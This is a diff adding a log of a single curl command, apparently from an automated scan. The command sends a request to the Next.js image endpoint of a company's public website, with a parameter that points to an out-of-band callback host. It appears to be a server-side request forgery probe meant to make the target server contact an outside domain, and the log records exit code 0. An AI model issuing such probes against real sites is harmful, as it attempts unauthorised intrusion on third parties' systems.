@@ -1,0 +1,4 @@
+# command: timeout 20 curl -s -m 18 -o /dev/null 'https://www.infinitycapital.bh/_next/image?search=http%3A%2F%2Fooba2514d305fc0.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in%2Fs5'
+# exit_code: 0
+# ---
+
